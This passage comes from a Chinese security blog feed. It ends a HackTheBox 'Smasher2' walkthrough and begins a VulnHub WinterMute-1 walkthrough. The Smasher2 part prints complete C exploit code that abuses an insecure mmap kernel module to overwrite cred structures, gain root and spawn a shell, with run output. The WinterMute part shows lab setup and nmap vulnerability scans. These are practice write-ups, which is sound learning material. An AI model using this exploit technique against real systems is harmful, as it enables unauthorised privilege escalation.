<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp2.c -o exp2</span><br><span class="line">exp2.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp2.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp2</span><br><span class="line">[+] PID: 1999</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a98484, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99384, credNum: 5</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99444, credNum: 6</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a995c4, credNum: 7</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99c84, credNum: 8</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6184, credNum: 9</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6484, credNum: 10</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6544, credNum: 11</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6b44, credNum: 12</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6c04, credNum: 13</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6d84, credNum: 14</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7744, credNum: 15</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e86c04, credNum: 16</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e87384, credNum: 17</span><br><span class="line">[+] Found cred structure! ptr: 0xb8e87984, credNum: 18</span><br><span class="line">[+] Found cred structure! ptr: 0xb9327c84, credNum: 19</span><br><span class="line">[+] Scanning loop END</span><br></pre></td></tr></table></figure>

<ul>
<li>查找当前进程Cred</li>
</ul>
<p>现在，更新代码，以便针对每个潜在的cred结构，将其更改为root用户和组ID 0，然后尝试运行getuid（）。 如果该值返回0（对于root用户），则说明我已经为当前进程修改了凭据结构。</p>
<p>更新代码，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UID: %d\n&quot;</span>, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = 0;</span><br><span class="line">    unsigned int credNum = 0;</span><br><span class="line">    <span class="keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size -0x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">            credIt = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getuid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(<span class="string">&quot;[+] GOT ROOT!&quot;</span>);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                credIt = 0;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，编译并运行，并且可以成为root用户，这意味着它可以正常工作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp3.c -o exp3</span><br><span class="line">exp3.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp3.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp3</span><br><span class="line">[+] PID: 2008</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99444, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a995c4, credNum: 5</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99c84, credNum: 6</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6184, credNum: 7</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6484, credNum: 8</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6544, credNum: 9</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6b44, credNum: 10</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6c04, credNum: 11</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d6d84, credNum: 12</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7144, credNum: 13</span><br><span class="line">[+] Found cred structure! ptr: 0xb87d7204, credNum: 14</span><br><span class="line">[+] GOT ROOT!</span><br><span class="line">[+] Scanning loop END</span><br></pre></td></tr></table></figure>
<p>在等待getchar（）时，可以检查该进程的状态，并查看它以root身份运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:~$ cat /proc/2008/status</span><br><span class="line">Name:   exp3</span><br><span class="line">Umask:  0002</span><br><span class="line">State:  S (sleeping)</span><br><span class="line">Tgid:   2008</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    2008</span><br><span class="line">PPid:   1833</span><br><span class="line">TracerPid:      0</span><br><span class="line">Uid:    0       0       0       0     &lt;-- root</span><br><span class="line">Gid:    0       0       0       0     &lt;-- root group</span><br><span class="line">FDSize: 256</span><br><span class="line">Groups: 4 24 30 46 111 112 1000 </span><br><span class="line">NStgid: 2008</span><br><span class="line">NSpid:  2008</span><br><span class="line">NSpgid: 2008</span><br><span class="line">NSsid:  1833</span><br><span class="line">VmPeak:  3936672 kB</span><br><span class="line">VmSize:  3936672 kB</span><br><span class="line">VmLck:         0 kB</span><br><span class="line">VmPin:         0 kB</span><br><span class="line">VmHWM:       792 kB</span><br><span class="line">VmRSS:       792 kB</span><br><span class="line">RssAnon:              64 kB</span><br><span class="line">RssFile:             720 kB</span><br><span class="line">RssShmem:              8 kB</span><br><span class="line">VmData:      176 kB</span><br><span class="line">VmStk:       132 kB</span><br><span class="line">VmExe:         8 kB</span><br><span class="line">VmLib:      2112 kB</span><br><span class="line">VmPTE:      7760 kB</span><br><span class="line">VmSwap:        0 kB</span><br><span class="line">HugetlbPages:          0 kB</span><br><span class="line">CoreDumping:    0</span><br><span class="line">Threads:        1</span><br><span class="line">SigQ:   0/7400</span><br><span class="line">SigPnd: 0000000000000000</span><br><span class="line">ShdPnd: 0000000000000000</span><br><span class="line">SigBlk: 0000000000000000</span><br><span class="line">SigIgn: 0000000000000000</span><br><span class="line">SigCgt: 0000000000000000</span><br><span class="line">CapInh: 0000000000000000</span><br><span class="line">CapPrm: 0000000000000000</span><br><span class="line">CapEff: 0000000000000000</span><br><span class="line">CapBnd: 0000003fffffffff</span><br><span class="line">CapAmb: 0000000000000000</span><br><span class="line">NoNewPrivs:     0</span><br><span class="line">Seccomp:        0</span><br><span class="line">Speculation_Store_Bypass:       thread vulnerable</span><br><span class="line">Cpus_allowed:   ffffffff,ffffffff,ffffffff,ffffffff</span><br><span class="line">Cpus_allowed_list:      0-127</span><br><span class="line">Mems_allowed:   00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001</span><br><span class="line">Mems_allowed_list:      0</span><br><span class="line">voluntary_ctxt_switches:        1</span><br><span class="line">nonvoluntary_ctxt_switches:     96</span><br></pre></td></tr></table></figure>

<ul>
<li>get root</li>
</ul>
<p>现在，我将其升级以获得shell。 只需要添加将功能设置为全1的代码，然后执行一个shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mman.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char* const* argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] PID: %d\n&quot;</span>, getpid());</span><br><span class="line">    int fd = open(<span class="string">&quot;/dev/dhid&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Open failed!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open OK fd: %d\n&quot;</span>, fd);</span><br><span class="line"></span><br><span class="line">    unsigned long size = 0xf0000000;</span><br><span class="line">    unsigned long mmapStart = 0x42424000;</span><br><span class="line">    unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x0);</span><br><span class="line">    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to mmap: &quot;</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="built_in">return</span>-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line">    unsigned int uid = getuid();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] UID: %d\n&quot;</span>, uid);</span><br><span class="line"></span><br><span class="line">    unsigned int credIt = 0;</span><br><span class="line">    unsigned int credNum = 0;</span><br><span class="line">    <span class="keyword">while</span> (((unsigned long)addr) &lt; (mmapStart + size -0x40))</span><br><span class="line">    &#123;</span><br><span class="line">        credIt = 0;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid &amp;&amp;</span><br><span class="line">            addr[credIt++] == uid</span><br><span class="line">            )</span><br><span class="line">        &#123;</span><br><span class="line">            credNum++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found cred structure! ptr: %p, credNum: %d\n&quot;</span>, addr, credNum);</span><br><span class="line"></span><br><span class="line">            credIt = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line">            addr[credIt++] = 0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getuid() == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                puts(<span class="string">&quot;[+] GOT ROOT!&quot;</span>);</span><br><span class="line"></span><br><span class="line">                credIt += 1; //skip 4 bytes to get to caps</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line">                addr[credIt++] = 0xffffffff;</span><br><span class="line"></span><br><span class="line">                execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-&quot;</span>, (char *)NULL);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                credIt = 0;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">                addr[credIt++] = uid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        addr++;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;[+] Scanning loop END&quot;</span>);</span><br><span class="line">    fflush(stdout);</span><br><span class="line"></span><br><span class="line">    int stop = getchar();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在像以前一样编译，然后运行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dzonerzy@smasher2:/dev/shm$ gcc exp4.c -o exp4</span><br><span class="line">exp4.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">exp4.c:30:32: warning: format ‘%x’ expects argument of <span class="built_in">type</span> ‘unsigned int’, but argument 2 has <span class="built_in">type</span> ‘unsigned int *’ [-Wformat=]</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;[+] mmap OK addr: %x\n&quot;</span>, addr);</span><br><span class="line">                               ~^</span><br><span class="line">                               %ls</span><br><span class="line">dzonerzy@smasher2:/dev/shm$ ./exp4</span><br><span class="line">[+] PID: 2019</span><br><span class="line">[+] Open OK fd: 3</span><br><span class="line">[+] mmap OK addr: 42424000</span><br><span class="line">[+] UID: 1000</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba6c4, credNum: 1</span><br><span class="line">[+] Found cred structure! ptr: 0x762ba9c4, credNum: 2</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a980c4, credNum: 3</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a98844, credNum: 4</span><br><span class="line">[+] Found cred structure! ptr: 0xb7a99204, credNum: 5</span><br><span class="line">[+] GOT ROOT!</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功获取root权限，现在读取flag并提交,帅到飞天。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">CREDITS.txt  root.txt</span><br><span class="line"><span class="comment"># cat CREDITS.txt</span></span><br><span class="line">SMASHER2 by dzonerzy@htb <span class="keyword">in</span> collaboration with xg0@htb have fun and be ready <span class="keyword">for</span> smasher3!</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">7791e0e************************</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb11.jpg"></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb12.jpg"></p>
<p>知识点总结：</p>
<ul>
<li>身份验证绕过</li>
<li>RCE与WAF绕过</li>
<li>不安全mmap程序实现的内核模块(该模块允许用户访问内核内存)</li>
</ul>
<p>最后演示一下性感大佬在线删除靶机，删自己的靶机，让别人无靶机可打，小盆友请勿模仿，太黄太暴力过程就不演示了！！！;)</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb13.jpg"></p>
<p>嗯，，，已经删到残废了。。。</p>
<p><font color="red">Game over</font></p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[WinterMute-1]</title>
    <url>/2020/01/13/WinterMute-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：WinterMute：1<br>发布日期：2018年7月5日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MWJIZ2R4MGlJMjRqdjdNRHpLY3JJUHRkOXJWRmFWb2tS">https://drive.google.com/open?id=1bHgdx0iI24jv7MDzKcrIPtd9rVFaVokR<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93aW50ZXJtdXRlL1dpbnRlcm11dGUtdjEuemlw">https://download.vulnhub.com/wintermute/Wintermute-v1.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS93aW50ZXJtdXRlL1dpbnRlcm11dGUtdjEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/wintermute/Wintermute-v1.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>一个新的OSCP风格实验室，涉及2台易受攻击的机器，以赛博朋克经典Neuromancer为主题-任何网络安全爱好者都必须阅读。该实验室利用了数据透视和后期开发，而我发现其他OSCP预处理实验室似乎缺乏。目标是在两台计算机上都root。您只需要默认的Kali Linux。</p>
<p>我将其评为“中级”。没有缓冲区溢出或漏洞利用开发-可以使用小的字典进行任何必要的密码破解。它与OSCP盒而不是CTF更为相关。我已经测试了很多，但是如果您发现任何问题或需要在这里微调我。</p>
<p>压缩下载中包含Virtual Box Lab的安装说明，但是这里有一个简短的摘要：Straylight-模拟带有2个NICS的面向公众的服务器。首先盖上此盖，然后转到最后一台机器。Neuromancer-在具有1个NIC的非公共网络中。您的Kali框应仅与Straylight位于同一虚拟网络上。需要VirtualBox。VMware无法正确导入。</p>
<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><p>Wintermute Vitrual Box设置指南本练习利用了数据透视，因此需要正确设置VirtualBox网络。所有动态ip都快速简便。运行或将每台计算机导入Virtual Box（文件&gt;&gt;导入设备）</p>
<p>STRAYLIGHT（网络＃1和＃2）-这是第一台获得root权限的计算机。</p>
<ul>
<li>Adapter 1 <ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #1<br>Advanced (we want 2 NIC’s, each on a separate network)</li>
<li>Adapter Type - Intel PRO/1000 T Server </li>
</ul>
</li>
<li>Adapter 2<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #2<br>Advanced</li>
<li>Adapter Type - Intel PRO/1000 MT Desktop (or other adapter type different than network #1).</li>
</ul>
</li>
</ul>
<p>NEUROMANCER（网络2）-这是获得root的最终机器。设置为具有1个网络。仅通过Straylight使用仅限主机的Eth适配器＃2访问。</p>
<ul>
<li>Adapter 1<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #2<br>Advanced</li>
<li>Adapter Type - Intel PRO/1000 MT Desktop</li>
</ul>
</li>
</ul>
<p>KALI（网络＃1）-您的攻击机器仅应在仅主机的适配器上设置，Straylight处于打开状态，如果选择，则为NAT。-您不应该从Kali盒中对Neuromancer进行ping操作。如果可以的话，你在作弊。</p>
<ul>
<li>Adapter 1<ul>
<li>Host-only Adapter</li>
<li>VirtualBox Host-Only Ethernet Adapter #1</li>
</ul>
</li>
</ul>
<p><img src="https://www.baslub.nl/wp-content/uploads/2019/01/Network-setup-768x332.png"></p>
<p>网络这样设置以便于通关了STRAYLIGHT之后，再通关NEUROMANCER</p>
<h4 id="Wintermute-Straylight"><a href="#Wintermute-Straylight" class="headerlink" title="Wintermute-Straylight"></a>Wintermute-Straylight</h4><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.111</span><br><span class="line">Host is up (0.00011s latency).</span><br><span class="line">MAC Address: 08:00:27:50:96:D9 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -T5 -v -A --script=vuln 192.168.56.111</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">25/tcp   open  smtp    Postfix smtpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_256_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: Unknown/Custom-generated</span><br><span class="line">|             Modulus Length: 2048</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 2048</span><br><span class="line">|     References:</span><br><span class="line">|_      https://www.ietf.org/rfc/rfc2246.txt</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /manual/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">3000/tcp open  http    Mongoose httpd</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.111</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.111:3000/</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|_    Form action: /authorize.html</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-fileupload-exploiter: </span><br><span class="line">|   </span><br><span class="line">|_    Couldn<span class="string">&#x27;t find a file-type field.</span></span><br><span class="line"><span class="string">|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-passwd: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| http-slowloris-check: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   Slowloris DOS attack</span></span><br><span class="line"><span class="string">|     State: LIKELY VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2007-6750</span></span><br><span class="line"><span class="string">|       Slowloris tries to keep many connections to the target web server open and hold</span></span><br><span class="line"><span class="string">|       them open as long as possible.  It accomplishes this by opening connections to</span></span><br><span class="line"><span class="string">|       the target web server and sending a partial request. By doing so, it starves</span></span><br><span class="line"><span class="string">|       the http server&#x27;</span>s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">|_http-stored-xss: Couldn<span 